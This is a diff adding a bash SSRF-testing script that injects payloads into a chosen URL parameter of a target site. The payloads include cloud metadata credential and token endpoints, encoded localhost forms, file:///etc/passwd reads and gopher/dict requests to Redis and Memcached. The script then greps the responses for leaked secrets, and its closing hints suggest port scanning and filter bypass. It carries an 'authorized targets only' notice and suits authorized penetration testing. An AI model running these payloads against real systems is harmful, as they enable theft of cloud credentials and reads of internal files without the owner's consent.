@@ -1,0 +1,153 @@
+#!/bin/bash
+set -euo pipefail
+
+# SSRF testing with various bypass techniques
+# Usage: ssrf-test <url> <param_name>
+
+[ $# -lt 2 ] && cat << 'EOF' && exit 1
+Usage: ssrf-test <url> <param_name>
+
+Tests for SSRF with:
+  - Cloud metadata endpoints (AWS, GCP, Azure)
+  - Internal IP addresses
+  - Localhost variations
+  - URL encoding bypasses
+  - DNS rebinding preparation
+  - Redirect chains
+
+Example: ssrf-test "https://api.example.com/fetch?url=http://example.com" url
+
+Note: Use responsibly and only on authorized targets
+EOF
+
+URL="$1"
+PARAM="$2"
+OUTPUT="ssrf-test-$(date +%s).txt"
+
+echo "[*] SSRF testing" | tee "$OUTPUT"
+echo "    URL: $URL" | tee -a "$OUTPUT"
+echo "    Parameter: $PARAM" | tee -a "$OUTPUT"
+echo "" | tee -a "$OUTPUT"
+
+# Test payloads
+declare -a PAYLOADS=(
+    # AWS metadata
+    "http://169.254.169.254/latest/meta-data/"
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    "http://169.254.169.254/latest/user-data"
+    # GCP metadata
+    "http://metadata.google.internal/computeMetadata/v1/"
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+    # Azure metadata
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    # Localhost variations
+    "http://localhost"
+    "http://127.0.0.1"
+    "http://0.0.0.0"
+    "http://[::1]"
+    "http://127.1"
+    "http://2130706433" # Decimal IP
+    "http://0x7f000001" # Hex IP
+    # Internal ranges
+    "http://192.168.1.1"
+    "http://10.0.0.1"
+    "http://172.16.0.1"
+    # Localhost bypass
+    "http://localtest.me"
+    "http://127.0.0.1.nip.io"
+    "http://127.0.0.1.xip.io"
+    # URL encoding
+    "http://127.0.0.1%00.example.com"
+    "http://127.0.0.1%2F%40example.com"
+    # Protocol wrappers
+    "file:///etc/passwd"
+    "file:///c:/windows/win.ini"
+    "gopher://127.0.0.1:6379/_INFO"
+    "dict://127.0.0.1:11211/stats"
+)
+
+VULNERABLE=0
+BLOCKED=0
+
+for payload in "${PAYLOADS[@]}"; do
+    # URL encode payload
+    ENCODED=$(echo "$payload" | jq -sRr @uri)
+
+    # Build test URL
+    TEST_URL=$(echo "$URL" | sed "s/$PARAM=[^&]*/$PARAM=$ENCODED/")
+
+    # Make request with timeout
+    RESPONSE=$(timeout 10 curl -sk "$TEST_URL" -w "\n%{http_code}\n%{time_total}" 2>/dev/null || echo -e "\ntimeout\n10")
+
+    STATUS=$(echo "$RESPONSE" | tail -2 | head -1)
+    TIME=$(echo "$RESPONSE" | tail -1)
+    BODY=$(echo "$RESPONSE" | head -n -2)
+
+    # Check for SSRF indicators
+    IS_VULN=0
+    REASON=""
+
+    # Cloud metadata indicators
+    if echo "$BODY" | grep -iqE "ami-id|instance-id|role-name|credentials|access.*key|secret|token|project-id|serviceAccount"; then
+        IS_VULN=1
+        REASON="Cloud metadata exposed"
+    fi
+
+    # File content indicators
+    if echo "$BODY" | grep -iqE "root:x:0:0|\\[boot loader\\]|\\[extensions\\]"; then
+        IS_VULN=1
+        REASON="Local file read"
+    fi
+
+    # Internal network response
+    if echo "$BODY" | grep -iqE "localhost|127\\.0\\.0\\.1|private|internal"; then
+        IS_VULN=1
+        REASON="Internal network accessible"
+    fi
+
+    # Response time (slow = potential SSRF)
+    if (( $(echo "$TIME > 5" | bc -l) )); then
+        IS_VULN=1
+        REASON="Slow response (possible network access)"
+    fi
+
+    # Status codes
+    if [[ "$STATUS" == "200" || "$STATUS" == "301" || "$STATUS" == "302" ]]; then
+        if [[ "$payload" =~ 169\.254\.169\.254|metadata|localhost|127\.0\.0\.1 ]]; then
+            IS_VULN=1
+            REASON="Successful connection to internal endpoint"
+        fi
+    fi
+
+    if [ $IS_VULN -eq 1 ]; then
+        VULNERABLE=$((VULNERABLE + 1))
+        {
+            echo "[!] POTENTIAL SSRF"
+            echo "    Payload: $payload"
+            echo "    Reason: $REASON"
+            echo "    Status: $STATUS"
+            echo "    Time: ${TIME}s"
+            echo "    Response preview:"
+            echo "$BODY" | head -10 | sed 's/^/      /'
+            echo ""
+        } | tee -a "$OUTPUT"
+    elif [[ "$STATUS" == "400" || "$STATUS" == "403" ]] && echo "$BODY" | grep -iqE "blocked|forbidden|not allowed|invalid"; then
+        BLOCKED=$((BLOCKED + 1))
+    fi
+done
+
+echo "" | tee -a "$OUTPUT"
+echo "SSRF testing complete!" | tee -a "$OUTPUT"
+echo "  Payloads tested: ${#PAYLOADS[@]}" | tee -a "$OUTPUT"
+echo "  Potentially vulnerable: $VULNERABLE" | tee -a "$OUTPUT"
+echo "  Blocked attempts: $BLOCKED" | tee -a "$OUTPUT"
+[ $VULNERABLE -gt 0 ] && echo "  Results: $OUTPUT" | tee -a "$OUTPUT"
+
+if [ $VULNERABLE -gt 0 ]; then
+    echo "" | tee -a "$OUTPUT"
+    echo "Next steps:" | tee -a "$OUTPUT"
+    echo "  1. Confirm findings manually" | tee -a "$OUTPUT"
+    echo "  2. Test for port scanning: http://127.0.0.1:PORT" | tee -a "$OUTPUT"
+    echo "  3. Try redirect chains to bypass filters" | tee -a "$OUTPUT"
+    echo "  4. Test DNS rebinding with tools like singularity.htb" | tee -a "$OUTPUT"
+fi
